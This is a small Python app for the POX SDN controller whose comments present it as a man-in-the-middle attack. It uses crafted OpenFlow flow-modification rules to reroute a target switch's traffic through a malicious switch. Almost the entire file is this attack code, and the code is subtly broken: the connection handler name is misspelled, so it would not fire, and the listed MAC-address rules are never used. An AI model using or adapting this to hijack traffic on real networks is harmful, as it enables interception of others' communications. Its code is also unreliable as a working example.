# Attack: Node 27 —> Node 42: Issuing a crafted flow rule from a malicious app in the controller 
# to reroute the traffic of the target switch through a malicious switch, thus launching a MiTM attack.

# Plan: Launch this as an appliation within pox


from pox.core import core
import pox.openflow.libopenflow_01 as of
from pox.lib.revent import *
from pox.lib.addresses import EthAddr

rules = [['00:00:00:00:00:01','00:00:00:00:00:02'],['00:00:00:00:00:02', '00:00:00:00:00:04'], ['00:00:00:00:00:08','00:00:00:00:00:03'],['00:00:00:00:00:07','00:00:00:00:00:02']]

class SDNMalForward (EventMixin):

        def __init__ (self):
                self.listenTo(core.openflow)

        def _handle_ConneectionUp (self,event):
                for rule in rules:

                        fm = of.ofp_flow_mod()  
                        fm.match.in_port = 1
                        fm.actions.append(of.ofp_action_output(port = 2))
                        event.connection.send(fm)

def launch():
        core.registerNew(SDNMalForward)
